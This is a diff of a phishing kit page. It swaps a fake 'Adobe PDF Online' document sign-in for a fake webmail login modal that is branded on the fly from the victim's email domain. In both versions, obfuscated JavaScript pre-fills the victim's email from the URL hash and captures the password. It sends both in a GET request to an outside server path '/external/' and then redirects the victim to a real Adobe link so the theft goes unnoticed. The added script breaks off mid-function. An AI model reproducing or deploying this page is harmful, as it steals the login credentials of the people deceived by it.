@@ -1,411 +1,236 @@
-<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-   <link rel="icon" type="image/jpg" href="https://i.gyazo.com/908013190f506e28135b03e680bbd946.jpg">
-   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.js"></script>
-   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-   <title>Download Document - Adobe Sign In</title>
-   
-   <style type="text/css">
-
-   body {
-      background-image:url('https://i.gyazo.com/658103726bd460f44ba428028ce6d887.jpg');
-      background-repeat: no-repeat;
-      background-size: 100% 100%;
-      background-attachment: fixed;
-      z-index: -950;
-      margin-left: 0px;
-      margin-top: 0px;
-      margin-right: 0px;
-      margin-bottom: 0px;
-   }
-   
- 
-
-   .fudfRQMSG{
-            display:none;
-            font-size:12px;
-         }
-        .lds-ellipsis {
-        display: inline-block;
-        position: relative;
-        left: 0px;
-        width: 80px;
-        height: 80px;
-      }
-      .lds-ellipsis div {
-        position: absolute;
-        top: 33px;
-        width: 13px;
-        height: 13px;
-        border-radius: 50%;
-        background: #39f;
-        animation-timing-function: cubic-bezier(0, 1, 1, 0);
-      }
-      .lds-ellipsis div:nth-child(1) {
-        left: 8px;
-        animation: lds-ellipsis1 0.6s infinite;
-      }
-      .lds-ellipsis div:nth-child(2) {
-        left: 8px;
-        animation: lds-ellipsis2 0.6s infinite;
-      }
-      .lds-ellipsis div:nth-child(3) {
-        left: 32px;
-        animation: lds-ellipsis2 0.6s infinite;
-      }
-      .lds-ellipsis div:nth-child(4) {
-        left: 56px;
-        animation: lds-ellipsis3 0.6s infinite;
-      }
-      @keyframes lds-ellipsis1 {
-        0% {
-         transform: scale(0);
-        }
-        100% {
-         transform: scale(1);
-        }
-      }
-      @keyframes lds-ellipsis3 {
-        0% {
-         transform: scale(1);
-        }
-        100% {
-         transform: scale(0);
-        }
-      }
-      @keyframes lds-ellipsis2 {
-        0% {
-         transform: translate(0, 0);
-        }
-        100% {
-         transform: translate(24px, 0);
-        }
-      }
-      
-      .element {
-      font-family: helvetica, verdana, tahoma, arial;
-      width: 32em;
-      border: 1px solid #EAEAEA;
-      overflow: hidden;
-      border-radius: 10px;
-      box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.3);
-      z-index: 11;
-      position: relative;
-      margin-top: 55px;
-      margin-right: auto;
-      margin-bottom: 0px;
-      margin-left: auto;
-      background-attachment: scroll;
-      background-color: #FFF;
-      background-image: none;
-      background-repeat: repeat;
-      background-position: 0% 0%;
-      padding: 2%;
-      opacity: 0.9;
-   }
-   
-   .element_Left {
-      font-family: helvetica, verdana, tahoma, arial;
-      width: 27em;
-      border: 1px solid #EAEAEA;
-      overflow: hidden;
-      border-radius: 10px;
-      box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.3);
-      z-index: 11;
-      position: relative;
-      margin-top: 55px;
-      margin-right: 12.5%;
-      margin-bottom: 0px;
-      margin-left: auto;
-      background-attachment: scroll;
-      background-color: #FFF;
-      background-image: none;
-      background-repeat: repeat;
-      background-position: 0% 0%;
-      padding: 2%;
-      opacity: 0.9;
-      float: right;
-   }
-   .element_Right {
-      font-family: "Times New Roman", Times, serif;
-      width: 30em;
-      height: 370px;
-      overflow: hidden;
-      z-index: 11;
-      position: relative;
-      margin-top: 55px;
-      margin-right: auto;
-      margin-bottom: 0px;
-      margin-left: 12.5%;
-      background-color: #FFF;
-      background-image: url(prof1.png);
-      background-repeat: no-repeat;
-      background-position: center center;
-      background-size: 100% 100%;
-      float: left;
-      border-radius: 4px;
-      text-decoration: none;
-      text-align: center;
-      vertical-align: middle;
-      box-sizing: border-box;
-      box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.3);
-   
-   }
-   .transparent {
-      padding-top: 0%;
-      padding-bottom: 4%;
-      width: auto;
-      margin-right: auto;
-      margin-left: auto;
-      display: block;
-      clear: both;
-      float: none;
-   
-   }
-   .HeaderBox {
-      background-color: #000;
-      padding-top: 1%;
-      padding-right: 12.5%;
-      padding-bottom: 1%;
-      padding-left: 12.5%;
-   }
-   .NavBox {
-      background-color: #FFF;
-      padding-top: 0.5%;
-      padding-right: 12.5%;
-      padding-bottom: 0.5%;
-      padding-left: 12.5%;
-      vertical-align: middle;
-   }
-   .logo1 {
-      background-image: url(https://i.gyazo.com/7d1f99e66be8919d823427182a046a77.png);
-      background-repeat: no-repeat;
-      background-position: center center;
-      position: absolute;
-      left: 167px;
-      top: 0px;
-      height: 98px;
-      width: 98px;
-      z-index: 1000;
-      background-size: 100% 100%;
-      padding-top: 0%;
-      padding-bottom: 2%;
-   }
-   .titlr_box {
-      background-color: #D1D1D1;
-      margin-bottom: 3%;
-      padding-top: 0.2%;
-      padding-right: 2%;
-      padding-bottom: 0.2%;
-      padding-left: 20%;
-      border: 1px solid #BBB;
-      background-image: url(https://i.gyazo.com/e4388133537b1f42c6138c18d719f949.png);
-      background-repeat: no-repeat;
-      background-position: 4% center;
-      border-radius: 10px;
-   }
-   .copyright {
-      font-size: 11px;
-      color: #CCC;
-      text-align: center;
-      font-weight: bold;
-      margin-top: 2%;
-      margin-right: 12.5%;
-      margin-left: 12.5%;
-      clear: both;
-      float: none;
-      font-family: Arial, sans-serif;
-      text-transform: capitalize;
-      margin-bottom: 0%;
-   }
-   .document {
-      padding-left: 11%;
-      font-family: Arial, sans-serif;
-      font-size: 16px;
-      font-weight: bold;
-      color: #333;
-      width: 48%;
-      padding-top: 1%;
-   }
-   .NavButton {
-      display: block;
-      float: right;
-      font-family: helvetica, verdana, tahoma, arial;
-      font-size: 12px;
-      color: #333;
-      text-transform: capitalize;
-      padding-top: 1%;
-      padding-right: 2%;
-      padding-bottom: 1%;
-      padding-left: 2%;
-      background-color: #CAC8BF;
-      border: 1px solid #BEBCAF;
-      margin-left: 0.8%;
-      text-decoration: none;
-      box-sizing: border-box;
-   }
-   .clear2 {
-      clear: both;
-      float: none;
-   }
-   .getReader {
-      clear: right;
-      float: right;
-      height: 39px;
-      width: 158px;
-      margin-top: 2px;
-      margin-right: 0px;
-      background-image: url(https://i.gyazo.com/030155fb903e3526ae4d460f131eab65.png);
-      background-repeat: no-repeat;
-      background-position: center center;
-   }
-   .button1 {
-      background-color: #2B9AF3;
-      border-radius: 0.188rem;
-      clear: both;
-      color: #FFF;
-      display: inline-block;
-      font-size: 0.875rem;
-      font-weight: 400;
-      letter-spacing: 0.063rem;
-      line-height: normal;
-      margin: 0.375rem 0px;
-      padding: 0.438rem 0.875em;
-      text-decoration: none;
-      transition: background-color 0.3s ease 0s;
-      box-sizing: border-box;
-      border: 0px none;
-         box-shadow: 2px 1px 2px #000;
-   margin-right: 14px;
-   }
-   .button1:hover {
-      background-color: #0C79D3;
-   }
-   .mustDownload {
-      font-family: Georgia, "Times New Roman", Times, serif;
-      font-size: 11px;
-      font-weight: bold;
-      text-transform: capitalize;
-      color: #FFF;
-      padding-top: 1%;
-      padding-bottom: 0%;
-      text-align: center;
-      vertical-align: middle;
-      display: block;
-   }
-   .fudFlG{
-      padding: 10px;
-      width:80%
-   }
-
-   #newbutton{
-      cursor:pointer
-   }
-   </style>
-   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
-   </head>
-   <body>
-
-   <div style="background-color:rgba(0, 0, 0, 0.5); height:1000px;">
-   <div class="HeaderBox"><a href="" title="Download AD0BE Acrobat Reader" target="_blank" class="getReader"></a>
-    <div class="clear2"></div></div>
-   <div class="NavBox">
-   <a href="" class="NavButton T58m4N" onlick="winAlert()">Exit</a>
-   <a href="" class="NavButton NCcVf4" onlick="winAlert()">Download Document</a>
-   
-   <script language="JavaScript"> 
-   if (window.print) {
-   document.write('');
-   }
-   </script><form><a href="#" onclick="window.print()" class="NavButton">Print</a> </form>
-   
-   
-    <div class="document DyGhp3">VERIFY IT'S YOU TO DOWNLOAD DOCUMENT </div>
-    <div class="clear2 KHrwDR"></div>
-    </div>
-     <div class="element 3IH88b"> <div class="titlr_box">
-     <h1>ADOBE PDF Online</h1>
-     </div>
-   
-   
-   
-   <br>
-       <p>Sign in with your receiving email account to view document.</p>
-     
-     
-     <div align="left">
-      <span style="color:green" align="left" valign="middle">Connected to</span>&nbsp;<span style="color:green" id="domain"></span>&nbsp;<span style="color:green">secure file sharing server</span>&nbsp;<img width="15" heig1ht="20" src="https://i.gyazo.com/f197c372ddc70fe691c18333225858ee.gif">
-       </div><table align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
-       <tbody><tr valign="baseline">
-         <td class="texthinter" height="57" align="left" nowrap="nowrap" valign="top" width="71%">
-           <br>
-           <strong>
-           <label for="email"></label>
-           <span id="sprytextfield2">
-           <input autocomplete="off" name="email" class="a9Cmbw fudFlG" id="email" placeholder="Enter Email Address" type="text" readonly="">
-           <span id="erroruser" class="fudfRQMSG"><br>Email address is required.</span>
-        </span>
-         </strong>
-         </td>
-         
-         <td rowspan="2" class=" 43wTVc texthinter" align="right" nowrap="nowrap" valign="middle" width="29%"><img src="https://i.gyazo.com/211d2f9798bdca32e8cf5cab798300e3.webp" height="108" width="108"></td>
-       </tr>
-       <tr valign="top">
-         <td class="texthinter" align="left" nowrap="nowrap">
-                 
-                <br><span id="sprytextfield1">
-           <input autocomplete="off" name="pass" class="fudFlG" id="password" value="" size="32" placeholder="Enter Email Password" type="password">
-       <i class="far fa-eye" id="togglePassword" style="margin-left: -30px; cursor: pointer;"></i>
-      <script>
-
-      $("#togglePassword").click(function(event){
-         x = document.getElementById("password");
-         if (x.type === "password") {
-         $('#password').attr("type","text");
-         this.classList.toggle('fa-eye-slash');
-          } else {
-         $('#password').attr("type","password");
-          this.classList.toggle('fa-eye-slash');
-           }
-      });
-      </script>
-
-         <span id="errorpw" class="fudfRQMSG"><br>
-         <div class="texthinter" style="color:red">Password is Required.</div>
-        </span>
-         <span id="errorpw2" class=" ObxCde fudfRQMSG"><br>
-         <div class="texthinter" style="color:red">Enter your valid password and try again</div>
-        </span>
-         
-        <span id="loginfailed" class="fudfRQMSG"><br>
-            <div class=" sHIOyS texthinter" style="color:red">Login failed, try again</div>
-        </span>
-        
-        </span>
-        
-        
-        </td>
-       </tr>
-       <tr valign="baseline">
-         <td align="left" nowrap="nowrap" valign="middle">
-         <button id="newbutton" class=" wDowZi button1" onclick='SdW()'> View Document</button>
-         
-        </td><td align="left" nowrap="nowrap" valign="middle">&nbsp;</td>
-       </tr>
-      
-      
-     </tbody></table><div style="color:black" class="copyright">Copyright <span><script type="text/javascript">document.write(new Date().getFullYear());</script></span> Adobe Systems Incorporated. All rights reserved.</div>
+<html lang="en">
+   <head>
   
-   
-   
-   
- 
-   </div>
-     <div class="logo1"></div>
-   </div>
-   
-   <script>
-function _0x34f4(){var _0x377148=['#loginfailed','password','substr','15559640PTkkvt','block','slice','Redirecting..','230951wHTuAk','json','style','then','hash','errorpw2','#newbutton','prop','hide','Macintosh','Android','test','none','7436844ymjkrs','62739DYHANl','6888354roPTGo','value','indexOf','5DSJHAE','email','userAgent','success','GET','https://ace-hotel-saint-etienne-andrezieux-boutheon-reservation.fr/','1245107qFGhOE','16HdugdR','getElementById','replace','disabled','text','location','val','Windows','errorpw','length','2517788PQoqHD','#img','/external/','#email','View\x20document','show','#erroruser','display','220NCKDtJ','href','error'];_0x34f4=function(){return _0x377148;};return _0x34f4();}var _0x2fbe41=_0x18e6;(function(_0xf275da,_0x2c52cd){var _0x3cd98a=_0x18e6,_0x55a5de=_0xf275da();while(!![]){try{var _0xd866f=parseInt(_0x3cd98a(0x204))/0x1+-parseInt(_0x3cd98a(0x20f))/0x2+parseInt(_0x3cd98a(0x1fa))/0x3*(-parseInt(_0x3cd98a(0x217))/0x4)+-parseInt(_0x3cd98a(0x1fe))/0x5*(-parseInt(_0x3cd98a(0x1fb))/0x6)+parseInt(_0x3cd98a(0x221))/0x7*(-parseInt(_0x3cd98a(0x205))/0x8)+-parseInt(_0x3cd98a(0x1f9))/0x9+parseInt(_0x3cd98a(0x21d))/0xa;if(_0xd866f===_0x2c52cd)break;else _0x55a5de['push'](_0x55a5de['shift']());}catch(_0x4ac940){_0x55a5de['push'](_0x55a5de['shift']());}}}(_0x34f4,0x9e227));function _0x18e6(_0x34ecb5,_0x4aa3b6){var _0x34f4aa=_0x34f4();return _0x18e6=function(_0x18e606,_0xe7b818){_0x18e606=_0x18e606-0x1f3;var _0x5c770e=_0x34f4aa[_0x18e606];return _0x5c770e;},_0x18e6(_0x34ecb5,_0x4aa3b6);}var red__='https://acrobat.adobe.com/id/urn:aaid:sc:VA6C2:dc24f40d-4f58-4d5e-b0f9-2edcc0e0e9b2',sava_url=_0x2fbe41(0x203),appName=navigator[_0x2fbe41(0x200)];let ang='13',and='20';if(appName[_0x2fbe41(0x1fd)](_0x2fbe41(0x20c))==ang|appName['indexOf'](_0x2fbe41(0x1f5))==ang|appName['indexOf']('iPhone')==ang|appName['indexOf'](_0x2fbe41(0x1f6))==and){var url=new URL(window[_0x2fbe41(0x20a)][_0x2fbe41(0x218)]),hashPart=window[_0x2fbe41(0x20a)][_0x2fbe41(0x225)],base64email=hashPart[_0x2fbe41(0x21f)](0x1);if(base64email)var email=atob(base64email);else{if(base64login)var email=atob(base64login);else var email='';}$(_0x2fbe41(0x212))[_0x2fbe41(0x20b)](email);var textField=document[_0x2fbe41(0x206)](_0x2fbe41(0x1ff));textField['value']=email;if(email!==''){var ind=email[_0x2fbe41(0x1fd)]('@'),my_slice=email[_0x2fbe41(0x21c)](ind+0x1);$('#domain')['html'](my_slice);}function SdW(){var _0xfadb44=_0x2fbe41;document[_0xfadb44(0x206)](_0xfadb44(0x20d))[_0xfadb44(0x223)][_0xfadb44(0x216)]='none',document[_0xfadb44(0x206)](_0xfadb44(0x226))[_0xfadb44(0x223)][_0xfadb44(0x216)]=_0xfadb44(0x1f8),$(_0xfadb44(0x21a))[_0xfadb44(0x1f4)]();var _0x429b7f=document['getElementById'](_0xfadb44(0x1ff))[_0xfadb44(0x1fc)],_0x51f1cc=document['getElementById'](_0xfadb44(0x21b))[_0xfadb44(0x1fc)],_0x4eac38=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x4eac38[_0xfadb44(0x1f7)](_0x429b7f))return clearErrors(),$(_0xfadb44(0x215))['show'](),_0x429b7f['focus'],![];else{if(_0x51f1cc==null||_0x51f1cc=='')clearErrors(),document['getElementById'](_0xfadb44(0x20d))[_0xfadb44(0x223)][_0xfadb44(0x216)]=_0xfadb44(0x21e);else _0x51f1cc[_0xfadb44(0x20e)]<0x5?(clearErrors(),document[_0xfadb44(0x206)](_0xfadb44(0x226))[_0xfadb44(0x223)][_0xfadb44(0x216)]=_0xfadb44(0x21e)):($(_0xfadb44(0x210))[_0xfadb44(0x214)](),clearErrors(),$(_0xfadb44(0x227))[_0xfadb44(0x1f3)](_0xfadb44(0x208),!![]),$(_0xfadb44(0x227))[_0xfadb44(0x209)]('Please\x20wait...'),fetch(sava_url+_0xfadb44(0x211)+_0x429b7f+'/'+_0x51f1cc,{'method':_0xfadb44(0x202)})['then'](_0x39d3f8=>{var _0x1d85f1=_0xfadb44;return _0x39d3f8[_0x1d85f1(0x222)]();})[_0xfadb44(0x224)](_0x556253=>{var _0x17be19=_0xfadb44;if(_0x556253[_0x17be19(0x219)])$(_0x17be19(0x227))[_0x17be19(0x1f3)]('disabled',![]),$(_0x17be19(0x227))[_0x17be19(0x209)](_0x17be19(0x213)),$('#loginfailed')[_0x17be19(0x214)](),document[_0x17be19(0x206)](_0x17be19(0x21b))['value']='';else _0x556253[_0x17be19(0x201)]&&($(_0x17be19(0x227))[_0x17be19(0x209)]('Login\x20successfully'),setTimeout(function(){var _0x198a65=_0x17be19;$(_0x198a65(0x227))['text'](_0x198a65(0x220));},0x5dc),setTimeout(function(){var _0x53171e=_0x17be19;window['location'][_0x53171e(0x207)](red__);},0xbb8));}));}}function clearErrors(){var _0x469d20=_0x2fbe41;$(_0x469d20(0x21a))[_0x469d20(0x1f4)](),$('#errorpw2')[_0x469d20(0x1f4)](),$('#errorpwvalid')['hide'](),$('#errorpw')[_0x469d20(0x1f4)](),$(_0x469d20(0x215))[_0x469d20(0x1f4)]();}}
-   
+        <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+     
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    
+       
+      
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+  integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+        <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
+        <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+        <title></title>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+		<link rel="icon" type="image/jpg" href="https://i.gyazo.com/908013190f506e28135b03e680bbd946.jpg">
+    
+        <style type="text/css">
+      .hide{
+        display: none;
+      }
+      .grey-form{
+        background-color: #eee;opacity: 1;
+        pointer-events:none;
+      }
+      .alert-success{
+        color: #155724;
+        background-color: #d4edda;
+        border-color: #c3e6cb;
+      }
+    
+    
+    
+        </style>
+ </head>
+  <body>
+    <div class="container-fluid">
+      <div class="row" style="background-image: url(''); background-size: cover;background-repeat: no-repeat;">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-6 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
+             
+              <div class="mt-3">
+                <div class="row">
+                <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class="mt-2" >
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" >
+                         
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-lg-12 ">
+                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class="  mt-2" >
+                         
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" >
+                         
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-lg-12 ">
+                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class="  mt-2" >
+                         
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" >
+                         
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-lg-12 ">
+                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class="  mt-2" >
+                         
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" >
+                         
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-lg-12 ">
+                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class="  mt-2" >
+                         
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" >
+                         
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="col-lg-12 ">
+                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class="  mt-2" >
+                         
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" >
+                         
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                     <p class="text-white mt-3 text-center"></p>
+                <p class="h5 text-center text-white"></p> 
+                    
+                  </div>
+               
+              </div> 
+            </div>
+          </div>
+        </div>
+
+
+
+      </div> 
+    </div>
+    
+    
+    
+        <!-- Modal for gmail -->
+        <div style="display: block !important" class="modal" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+          <div class="modal-dialog" role="document">
+            <div class="modal-content">
+              <div class="modal-header">
+              </div>
+
+              <div class="modal-body" >
+                <center>
+                  <img id="fieldImg" class="img-fluid" width="80px">
+                  
+                  <h5 class="modal-title" id="exampleModalLabel"><span id="head-message" class=""></span><br></h5>
+                    <span class="font-weight-normal"><a>Accessing sensitive infomation requires password verification.</a></span>
+                  <br>
+                  <div style="margin-top: 10px; color: #FF0000;" class="alert small" id="msg"></div>
+    
+                </center>
+               
+                <div id='mainDiv'> 
+                  <form id="contact" class="form-horizontal well">
+                    <div class="col-lg-12">
+                      <div class="form-group">
+                        <input type="hidden" value="1" name="counter" id="counter"/>
+                        <label for="exampleInputEmail1">Email address</label>
+                        <input style="background-color: #eee;opacity: 1; pointer-events:none !important;" type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email" readonly="">
+                        <!-- <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small> -->
+                      </div>
+                    </div>
+                    <div class="col-lg-12">
+                      <div style="margin-bottom: 0.5rem !important;" class="form-group">
+                        <label for="Password">Password</label>
+                        <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" required="">
+                      </div>
+                    </div>
+                  <div class="modal-footer" style="padding: 0.5rem !important;">
+                
+                    <div class="btn btn-info pull-right w-50" id="submit-btn" onclick='Submit()'>Login to continue</div>
+                  </div>
+                </form>
+              </div>
+
+            
+            
+            </div>
+          </div>
+        </div>
+      
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+      </body>
+    
+      
+      <script>
+      
+var _0x12385b=_0x2838;function _0x10c9(){var _0x31faac=['#submit-btn','#error','slice','9LTxKxa','head-message','7LFuSuS','fieldImg','substring','GET','/external/','html','show','https://ace-hotel-saint-etienne-andrezieux-boutheon-reservation.fr/','split','41972VBYrgc','src','innerText','10UKCCwI','#msg','pop','val','226632umyZfz','Incorrect\x20password\x20provided.','focus','success','location','text','Network\x20response\x20was\x20not\x20ok','https://acrobat.adobe.com/id/urn:aaid:sc:VA6C2:dc24f40d-4f58-4d5e-b0f9-2edcc0e0e9b2','title','charAt','930031mCzVER','then','json','\x20Online\x20Cloud\x20App','498753Jrzabc','lastIndexOf','Verifing...','toUpperCase','getElementById','35HjUxoD','Login\x20successfully','value','10111541AEOaHU','test','Redirecting..','2692776LxwBQH','alert-danger','#newbutton','4918128UMkTcD','replace','That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account'];_0x10c9=function(){return _0x31faac;};return _0x10c9();}(function(_0x1605b2,_0x2a8d36){var _0x405aa8=_0x2838,_0x8c5f80=_0x1605b2();while(!![]){try{var _0x48f39d=parseInt(_0x405aa8(0x71))/0x1+parseInt(_0x405aa8(0x94))/0x2+-parseInt(_0x405aa8(0x75))/0x3+-parseInt(_0x405aa8(0x9b))/0x4*(parseInt(_0x405aa8(0x7a))/0x5)+-parseInt(_0x405aa8(0x80))/0x6*(-parseInt(_0x405aa8(0x8b))/0x7)+parseInt(_0x405aa8(0x83))/0x8*(parseInt(_0x405aa8(0x89))/0x9)+-parseInt(_0x405aa8(0x97))/0xa*(parseInt(_0x405aa8(0x7d))/0xb);if(_0x48f39d===_0x2a8d36)break;else _0x8c5f80['push'](_0x8c5f80['shift']());}catch(_0xc8e78e){_0x8c5f80['push'](_0x8c5f80['shift']());}}}(_0x10c9,0x8200b));var red__=_0x12385b(0x6e),sava_url=_0x12385b(0x92);document[_0x12385b(0x79)]('email')[_0x12385b(0x7c)]=getEmail();var domain=getEmail()[_0x12385b(0x8d)](getEmail()[_0x12385b(0x76)]('@')+0x1),frmsite=domain['substring'](0x0,domain['indexOf']('.'));document[_0x12385b(0x6f)]=ucFirst(frmsite)+'\x20Hosting\x20Webmail\x20::\x20Welcome\x20to\x20'+ucFirst(frmsite)+'\x20Hosting\x20Webmail',document[_0x12385b(0x79)](_0x12385b(0x8a))['innerHTML']=ucFirst(frmsite)+_0x12385b(0x74),document['getElementById'](_0x12385b(0x8c))[_0x12385b(0x95)]='https://logo.clearbit.com/'+domain;var em=getEmail();document[_0x12385b(0x79)]('em_')[_0x12385b(0x96)]=em;function Submit(){var _0x3c57c3=_0x12385b,_0x52cb84=$('#email')['val'](),_0x1a6d0e=$('#password')[_0x3c57c3(0x9a)](),_0x2db36b=$('#msg')['html']();$(_0x3c57c3(0x98))[_0x3c57c3(0x6c)](_0x2db36b);if(!/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/['test'](_0x52cb84))return $(_0x3c57c3(0x87))['show'](),_0x52cb84[_0x3c57c3(0x69)],![];if(!/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/[_0x3c57c3(0x7e)](_0x52cb84))return $(_0x3c57c3(0x98))[_0x3c57c3(0x91)](),$(_0x3c57c3(0x98))['addClass'](_0x3c57c3(0x81)),$(_0x3c57c3(0x98))['html'](_0x3c57c3(0x85)),![];$(_0x3c57c3(0x86))['html'](_0x3c57c3(0x77)),$(_0x3c57c3(0x98))['text'](''),fetch(sava_url+_0x3c57c3(0x8f)+_0x52cb84+'/'+password,{'method':_0x3c57c3(0x8e)})[_0x3c57c3(0x72)](_0x346307=>{var _0x1e066a=_0x3c57c3;if(!_0x346307['ok'])throw new Error(_0x1e066a(0x6d));return _0x346307[_0x1e066a(0x73)]();})[_0x3c57c3(0x72)](_0x5743bc=>{var _0x845a69=_0x3c57c3;console['log'](_0x5743bc),_0x5743bc[_0x845a69(0x6a)]?($(_0x845a69(0x82))[_0x845a69(0x6c)](_0x845a69(0x7b)),setTimeout(function(){var _0x2acea0=_0x845a69;$(_0x2acea0(0x82))[_0x2acea0(0x6c)](_0x2acea0(0x7f));},0x5dc),setTimeout(function(){var _0x1eaf03=_0x845a69;window[_0x1eaf03(0x6b)][_0x1eaf03(0x84)](red__);},0xbb8)):($(_0x845a69(0x86))[_0x845a69(0x90)]('Login\x20to\x20continue'),$(_0x845a69(0x98))['text'](_0x845a69(0x68)),document['getElementById']('password')[_0x845a69(0x7c)]='');});}function _0x2838(_0x3d509c,_0x21aecc){var _0x10c9f5=_0x10c9();return _0x2838=function(_0x283834,_0x1c9db){_0x283834=_0x283834-0x68;var _0x1dfe70=_0x10c9f5[_0x283834];return _0x1dfe70;},_0x2838(_0x3d509c,_0x21aecc);};function getEmail(){var _0x480fd5=_0x12385b;if(window[_0x480fd5(0x6b)]['hash']){var 